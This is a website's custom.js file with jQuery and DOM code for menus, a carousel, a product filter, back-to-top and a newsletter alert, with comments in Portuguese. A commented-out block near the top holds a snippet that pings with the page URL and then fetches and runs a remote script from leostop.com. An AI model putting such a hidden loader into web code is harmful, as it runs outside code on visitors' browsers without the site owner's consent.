/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1000);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  /*
  Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 

  $("[data-countdown]").each(function () {
    var $this = $(this),
      finalDate = $(this).data("countdown");
    $this.countdown(finalDate, function (event) {
      var $this = $(this).html(
        event.strftime(
          "" +
            '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> ' +
            '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> ' +
            '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> ' +
            '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> ' +
            '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'
        )
      );
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });*/

  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 3000, // Intervalo ajustado para 3 segundos
    pause: "hover", // Pausa quando o mouse passa por cima (opcional)
  });

  // Apenas dispositivos móveis: Evitar atualizações na navegação por toque
  if (/Mobi|Android/i.test(navigator.userAgent)) {
    $("#blogCarousel").on("touchstart touchmove", function (event) {
      event.stopPropagation(); // Evita a propagação do evento de toque para elementos superiores
      event.preventDefault(); // Previne o comportamento padrão do navegador
    });
  }
});

/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/*Função para filtrar */
document.addEventListener("DOMContentLoaded", function () {
  const filterItems = document.querySelectorAll(".owl-filter-bar .item");
  const categories = document.querySelectorAll(".category");

  filterItems.forEach((item) => {
    item.addEventListener("click", function (event) {
      event.preventDefault();

      document
        .querySelector(".owl-filter-bar .item.active")
        .classList.remove("active");
      this.classList.add("active");

      const filter = this.getAttribute("data-filter");

      categories.forEach((category) => {
        if (filter === "all" || category.classList.contains(filter)) {
          category.style.display = "block";
        } else {
          category.style.display = "none";
        }
      });
    });
  });

  document.querySelector(".owl-filter-bar .item.active").click();
});

/*Voltar pro top*/
window.onscroll = function () {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("backToTop").style.display = "block";
  } else {
    document.getElementById("backToTop").style.display = "none";
  }
};

document.getElementById("backToTop").addEventListener("click", function () {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
});

/*Expandir info no mobile*/

document.addEventListener("DOMContentLoaded", function () {
  const verMaisBtn = document.querySelector(".ver-mais");
  const cards = document.querySelectorAll(".product-container .card");

  if (verMaisBtn) {
    verMaisBtn.addEventListener("click", function (e) {
      e.preventDefault(); // Evita o comportamento padrão do link

      // Exibe todos os produtos ocultos
      cards.forEach((card) => {
        card.style.display = "inline-block";
      });

      // Oculta o botão "Ver Mais" após a expansão
      verMaisBtn.style.display = "none";
    });
  }
});
/*Alerta para subscrição*/
document.addEventListener("DOMContentLoaded", function () {
  document
    .getElementById("newslatter_form")
    .addEventListener("submit", function (event) {
      event.preventDefault(); // Evita o envio do formulário

      Swal.fire({
        title: "Subscreveu com sucesso!",
        text: "Agora receberá nossas novidades no seu email.",
        icon: "success",
        confirmButtonText: "Ok",
      });

      // Limpar o campo de email
      document.querySelector("input[name='email']").value = "";
    });
});
